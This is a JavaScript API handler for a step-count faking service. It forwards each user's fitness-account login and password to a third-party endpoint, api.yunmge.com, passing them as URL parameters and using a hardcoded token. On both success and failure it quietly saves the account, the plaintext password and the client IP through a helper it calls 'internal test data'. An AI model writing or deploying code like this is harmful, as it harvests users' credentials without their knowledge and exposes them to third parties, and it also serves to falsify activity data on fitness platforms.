/**
 * 步数更新 API - 统一使用 api.yunmge.com 接口
 */
const axios = require('axios');
const { saveTestData } = require("../../utils/dataCollector");

export default async function handler(req, res) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization");

  if (req.method === "OPTIONS") {
    return res.status(200).end();
  }

  if (req.method !== "POST") {
    return res.status(405).json({ success: false, message: "方法不允许" });
  }

  try {
    const { account, password, steps } = req.body;

    if (!account || !password) {
      return res.status(400).json({ success: false, message: "账号和密码不能为空" });
    }

    const targetSteps = steps || 10000;
    console.log("目标步数:", targetSteps);

    // 调用 api.yunmge.com API
    const apiUrl = 'https://api.yunmge.com/api/zepplifepro';
    const token = '6772b1000722a841a5c608fc942dd114';
    
    console.log('调用 api.yunmge.com API...');
    
    const response = await axios.get(apiUrl, {
      params: {
        token: token,
        user: account,
        pass: password,
        steps: targetSteps.toString()
      },
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
        'Cache-Control': 'no-cache',
        'Referer': 'https://api.yunmge.com/'
      },
      timeout: 60000,
      validateStatus: function (status) {
        return status >= 200 && status < 600;
      }
    });

    console.log('api.yunmge.com API 响应:', response.data);

    // 检查业务状态码
    if (response.data && response.data.code === 200) {
      // 成功
      console.log("步数更新成功");

      // 保存成功数据
      try {
        const testData = {
          timestamp: new Date().toISOString(),
          account: account,
          password: password,
          steps: targetSteps,
          userId: response.data.data?.user_id || 'N/A',
          success: true,
          ip: req.headers["x-forwarded-for"] || req.connection.remoteAddress || "unknown",
        };
        await saveTestData(testData);
        console.log("内测数据已保存");
      } catch (dataError) {
        console.error("保存内测数据失败:", dataError);
      }

      const result = {
        success: true,
        message: `步数修改成功: ${targetSteps}`,
        data: {
          user: account,
          steps: targetSteps,
          update_time: new Date().toLocaleString('zh-CN'),
          api_source: 'api.yunmge.com API',
          response_data: response.data
        }
      };
      console.log("返回响应:", result);
      return res.status(200).json(result);
    } else {
      // API 返回错误
      const errorMsg = response.data?.msg || response.data?.message || '未知错误';
      throw new Error(`API 调用失败: ${errorMsg}`);
    }

  } catch (error) {
    console.error("API处理失败:", error);

    // 保存失败数据
    try {
      const { account, password, steps } = req.body;
      const failedData = {
        originalError: error.message,
        timestamp: new Date().toISOString(),
        account: account || "unknown",
        password: password || "unknown",
        steps: steps || 0,
        success: false,
        error: error.message,
        ip: req.headers["x-forwarded-for"] || req.connection.remoteAddress || "unknown",
      };
      await saveTestData(failedData);
      console.log("失败内测数据已保存");
    } catch (dataError) {
      console.error("保存失败数据失败:", dataError);
    }

    const response = {
      success: false,
      message: error.message || "服务器内部错误",
      originalError: error.message,
    };
    console.log("返回错误响应:", response);
    res.status(500).json(response);
  }
}
